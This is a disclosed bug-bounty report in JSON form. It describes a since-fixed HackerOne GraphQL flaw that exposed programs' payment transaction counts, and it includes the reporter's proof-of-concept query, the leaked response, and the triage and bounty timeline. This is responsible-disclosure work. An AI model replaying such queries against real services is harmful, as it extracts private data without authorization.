{"id":707433,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83MDc0MzM=","url":"https://hackerone.com/reports/707433","title":"Disclosure of `payment_transactions` for programs via GraphQL query","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-10-04T05:27:30.442Z","submitted_at":"2019-10-04T05:27:30.442Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"msdian7","url":"/msdian7","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13,"url":"https://hackerone.com/security","handle":"security","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"HackerOne","twitter_handle":"Hacker0x01","website":"https://hackerone.com","about":"Vulnerability disclosure should be safe, transparent, and rewarding."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2019-12-01T18:13:59.537Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-11-01T18:13:58.604Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"**Summary:**\npayment transactions count of programs exposed\n\n**Description:**\npayment transactions details can be only accessed by program team members, but there is an flaw, with that, an unauthorized user can get payment transactions count of any program (i have confirmed only with public program)\n\n### Steps To Reproduce\n\n1.) Execute the below graphql\n\nPOST /graphql? HTTP/1.1\nHost: hackerone.com\n\n{\"query\":\"query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,base_bounty,payment_transactions{total_count}}\",\"variables\":{\"handle_0\":\"████\",\"size_1\":\"small\"}}\n\n\n2.)  you will get below response \n\n{\"data\":{\"team\":{\"id\":\"█████████\",\"name\":\"███████\",\"about\":\"█████████\",\"_profile_picturePkPpF\":\"█████████\",\"offers_swag\":true,\"offers_bounties\":true,\"base_bounty\":null,\"payment_transactions\":{\"total_count\":9}}}}\n\n\n3.)  done, payment transactions count of ████ is 9\n\n## Impact\n\nUnauthorized user can get private data","vulnerability_information_html":"\u003cp\u003e\u003cstrong\u003eSummary:\u003c/strong\u003e\u003cbr\u003e\npayment transactions count of programs exposed\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eDescription:\u003c/strong\u003e\u003cbr\u003e\npayment transactions details can be only accessed by program team members, but there is an flaw, with that, an unauthorized user can get payment transactions count of any program (i have confirmed only with public program)\u003c/p\u003e\n\n\u003ch3 id=\"steps-to-reproduce\"\u003eSteps To Reproduce\u003c/h3\u003e\n\n\u003cp\u003e1.) Execute the below graphql\u003c/p\u003e\n\n\u003cp\u003ePOST /graphql? HTTP/1.1\u003cbr\u003e\nHost: hackerone.com\u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;query\u0026quot;:\u0026quot;query Team_mini_profile($handle_0:String!,$size_1:ProfilePictureSizes!) {team(handle:$handle_0) {id,...F0}} fragment F0 on Team {id,name,about,_profile_picturePkPpF:profile_picture(size:$size_1),offers_swag,offers_bounties,base_bounty,payment_transactions{total_count}}\u0026quot;,\u0026quot;variables\u0026quot;:{\u0026quot;handle_0\u0026quot;:\u0026quot;████\u0026quot;,\u0026quot;size_1\u0026quot;:\u0026quot;small\u0026quot;}}\u003c/p\u003e\n\n\u003cp\u003e2.)  you will get below response \u003c/p\u003e\n\n\u003cp\u003e{\u0026quot;data\u0026quot;:{\u0026quot;team\u0026quot;:{\u0026quot;id\u0026quot;:\u0026quot;█████████\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;███████\u0026quot;,\u0026quot;about\u0026quot;:\u0026quot;█████████\u0026quot;,\u0026quot;_profile_picturePkPpF\u0026quot;:\u0026quot;█████████\u0026quot;,\u0026quot;offers_swag\u0026quot;:true,\u0026quot;offers_bounties\u0026quot;:true,\u0026quot;base_bounty\u0026quot;:null,\u0026quot;payment_transactions\u0026quot;:{\u0026quot;total_count\u0026quot;:9}}}}\u003c/p\u003e\n\n\u003cp\u003e3.)  done, payment transactions count of ████ is 9\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eUnauthorized user can get private data\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-12-01T18:13:58.709Z","allow_singular_disclosure_after":-33999984.12032673,"singular_disclosure_allowed":true,"vote_count":166,"voters":["checkm50","dittyroma","uvs","mashoud1122","wisp","spam404","base_64","mik317","sameerphad72","nikitastupin","and 156 more..."],"severity":{"rating":"medium","score":4.4,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":3,"asset_type":"URL","asset_identifier":"https://hackerone.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":5956185,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"some response got missed in initial description , the actual response is \n\n```\n{\"data\":{\"team\":{\"id\":\"██████\",\"name\":\"█████\",\"about\":\"█████████\",\"_profile_picturePkPpF\":\"███\",\"offers_swag\":true,\"offers_bounties\":true,\"base_bounty\":null,\"payment_transactions\":{\"total_count\":9}}}}\n```","markdown_message":"\u003cp\u003esome response got missed in initial description , the actual response is \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\u0026quot;data\u0026quot;:{\u0026quot;team\u0026quot;:{\u0026quot;id\u0026quot;:\u0026quot;██████\u0026quot;,\u0026quot;name\u0026quot;:\u0026quot;█████\u0026quot;,\u0026quot;about\u0026quot;:\u0026quot;█████████\u0026quot;,\u0026quot;_profile_picturePkPpF\u0026quot;:\u0026quot;███\u0026quot;,\u0026quot;offers_swag\u0026quot;:true,\u0026quot;offers_bounties\u0026quot;:true,\u0026quot;base_bounty\u0026quot;:null,\u0026quot;payment_transactions\u0026quot;:{\u0026quot;total_count\u0026quot;:9}}}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2019-10-04T05:43:36.744Z","updated_at":"2019-11-01T18:13:23.184Z","actor":{"username":"msdian7","cleared":false,"url":"/msdian7","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5960578,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @msdian7,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@antenna ","markdown_message":"\u003cp\u003eHi \u003ca href=\"/msdian7\"\u003e@msdian7\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\u003c/p\u003e\n\n\u003cp\u003eKind regards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T16:14:00.385Z","updated_at":"2019-10-04T16:14:00.385Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5960622,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-04T16:15:48.400Z","updated_at":"2019-10-04T16:15:48.400Z","additional_data":{"old_severity":"Medium","new_severity":"Medium (4.4)","old_severity_id":530969,"new_severity_id":531355},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5960627,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-04T16:16:06.124Z","updated_at":"2019-10-04T16:16:06.124Z","additional_data":{"added_weaknesses":[{"id":18,"name":"Information Disclosure"}],"removed_weaknesses":[{"id":65,"name":"Business Logic Errors"}]},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5960648,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-04T16:18:12.917Z","updated_at":"2019-10-04T16:18:12.917Z","additional_data":{"old_title":"payment transactions count of programs exposed","new_title":"Disclosure of `payment_transactions` for programs via GraphQL query"},"actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5960690,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-10-04T16:24:07.409Z","updated_at":"2019-10-04T16:24:07.409Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5960694,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @msdian7,\n\nThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\n\nRegards,\n@antenna ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/msdian7\"\u003e@msdian7\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eThank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\n\u003ca href=\"/antenna\"\u003e@antenna\u003c/a\u003e \u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-04T16:24:23.752Z","updated_at":"2019-10-04T16:24:23.752Z","actor":{"username":"antenna","cleared":false,"url":"/antenna","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/B1a8q5ga9BZjMczKoqAbnMj5/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":true,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":5965061,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Note : We can find an external program is running private program or not with this exploit","markdown_message":"\u003cp\u003eNote : We can find an external program is running private program or not with this exploit\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-05T10:00:16.204Z","updated_at":"2019-10-05T10:00:16.204Z","actor":{"username":"msdian7","cleared":false,"url":"/msdian7","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6016921,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks @msdian7, nice find!","markdown_message":"\u003cp\u003eThanks \u003ca href=\"/msdian7\"\u003e@msdian7\u003c/a\u003e, nice find!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-11T16:44:37.122Z","updated_at":"2019-10-11T16:44:37.122Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"bounty_amount":"2500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"security","collaborator":{"username":"msdian7","url":"/msdian7"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6166299,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"hi @msdian7 - our engineering team has released a fix for this. could you please take a look and verify if it's fixed? thanks!","markdown_message":"\u003cp\u003ehi \u003ca href=\"/msdian7\"\u003e@msdian7\u003c/a\u003e - our engineering team has released a fix for this. could you please take a look and verify if it\u0026#39;s fixed? thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-29T17:26:26.760Z","updated_at":"2019-10-29T17:26:26.760Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6169380,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@pei I can not reproduce this issue now, null value returns for payment_transactions , BTW i have filed https://hackerone.com/reports/705952 before 28 days still no updates, can you please check that ?","markdown_message":"\u003cp\u003e\u003ca href=\"/pei\"\u003e@pei\u003c/a\u003e I can not reproduce this issue now, null value returns for payment_transactions , BTW i have filed \u003ca title=\"https://hackerone.com/reports/705952\" href=\"https://hackerone.com/reports/705952\"\u003ehttps://hackerone.com/reports/705952\u003c/a\u003e before 28 days still no updates, can you please check that ?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-30T05:23:23.040Z","updated_at":"2019-10-30T05:23:23.040Z","actor":{"username":"msdian7","cleared":false,"url":"/msdian7","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6174732,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"thanks again!","markdown_message":"\u003cp\u003ethanks again!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-10-30T17:12:09.301Z","updated_at":"2019-10-30T17:12:26.825Z","actor":{"username":"pei","cleared":false,"url":"/pei","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/016/939/2d83322336a492279dc84d8f92f280c2d54fcb5b_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"msdian7","url":"/msdian7"},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6195357,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-11-01T18:13:58.625Z","updated_at":"2019-11-01T18:13:58.625Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6442810,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-12-01T18:13:59.564Z","updated_at":"2019-12-01T18:13:59.564Z","actor":{"url":"/security","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"HackerOne"}},"genius_execution_id":null,"team_handle":"security","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}